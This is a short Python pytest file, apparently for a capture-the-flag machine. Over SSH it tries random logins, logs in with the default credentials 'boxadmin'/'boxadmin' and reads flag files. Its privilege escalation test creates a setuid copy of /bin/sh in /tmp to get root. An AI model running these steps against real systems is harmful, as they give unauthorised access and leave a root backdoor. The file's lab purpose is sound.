import pytest
import paramiko
from random import choice
import string

def generate_random_credentials(num):
    """
    產生隨機帳號與密碼。
    Args:
        num (int): 產生帳號的數量
    Returns:
        list of tuples: 返回一個包含帳號與密碼的列表
    """
    usernames = ['user' + str(i) for i in range(num)]
    passwords = [''.join(choice(string.ascii_letters + string.digits) for _ in range(8)) for _ in range(num)]
    return list(zip(usernames, passwords))

def ssh_login(hostname, username, password, command='echo Connection Successful'):
    """
    嘗試通過SSH登入並執行命令。
    Args:
        hostname (str): SSH服務器地址
        username (str): 登入帳號
        password (str): 登入密碼
        command (str): 執行的命令
    Returns:
        str: 命令的輸出
    Raises:
        Exception: 登入失敗或命令執行出錯
    """
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname, username=username, password=password, timeout=10)
        stdin, stdout, stderr = client.exec_command(command)
        output = stdout.read().decode()
        client.close()
        return output
    except Exception as e:
        return str(e)

@pytest.mark.parametrize("credentials", generate_random_credentials(10))
def test_ssh_login_fail(credentials):
    """
    測試隨機帳號登入應該失敗。
    """
    hostname = 'your_target_ip'
    username, password = credentials
    assert 'permission denied' in ssh_login(hostname, username, password).lower()

def test_ssh_login_success():
    """
    測試已知帳號登入應該成功。
    """
    hostname = 'your_target_ip'
    output = ssh_login(hostname, 'boxadmin', 'boxadmin', 'cat ~/user.txt')
    assert 'Connection Successful' in output or 'your_expected_user_text' in output

def test_privilege_escalation():
    """
    測試提權並讀取root文件。
    """
    hostname = 'your_target_ip'
    # Example of privilege escalation, replace 'cp /bin/sh /tmp/privileged' with your actual escalation command
    ssh_login(hostname, 'boxadmin', 'boxadmin', 'sudo cp /bin/sh /tmp/privileged; sudo chmod +s /tmp/privileged')
    output = ssh_login(hostname, 'boxadmin', 'boxadmin', 'cat ~/root.txt')
    assert 'your_expected_root_text' in output
